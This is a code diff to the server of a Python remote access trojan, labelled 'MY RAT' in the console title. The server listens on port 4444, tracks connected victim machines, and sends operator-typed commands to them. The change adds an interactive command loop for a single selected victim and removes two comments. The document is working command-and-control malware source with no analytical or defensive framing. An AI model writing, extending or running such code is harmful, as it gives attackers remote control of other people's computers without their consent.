@@ -33,14 +33,13 @@ def handle_client(client_socket, addr):
     if os.name == "nt":
         ctypes.windll.kernel32.SetConsoleTitleW(f"MY RAT | CONNECTED CLIENTS: {len(clients)}")
 
-    while not shutdown:  # Check the shutdown flag
+    while not shutdown: 
         try:
             response = client_socket.recv(4096).decode()
             if not response:
                 break
             print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
         except (ConnectionResetError, BrokenPipeError, OSError):
-            # Handle socket errors gracefully
             break
 
     print(f"\n{Fore.RED}[-]{Fore.RESET} Client {addr[0]} disconnected")
@@ -107,8 +106,13 @@ def start_server(host="0.0.0.0", port=4444):
                 client.send(command.encode())
         elif 0 <= choice < len(clients):
             target_addr = list(clients.keys())[choice]
-            command = input(f"{target_addr[0]}> ")
-            clients[target_addr].send(command.encode())
+            print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Interracting with {target_addr[0]}")
+            while True:
+                command = input(f"{target_addr[0]}> ")
+                if command.lower() == "back":
+                    print(f"{Fore.YELLOW}[*]{Fore.RESET} Returning to the main menu...")
+                    break
+                clients[target_addr].send(command.encode())
         else:
             print(f"[{Fore.RED}!{Fore.RESET}] Invalid selection")
 
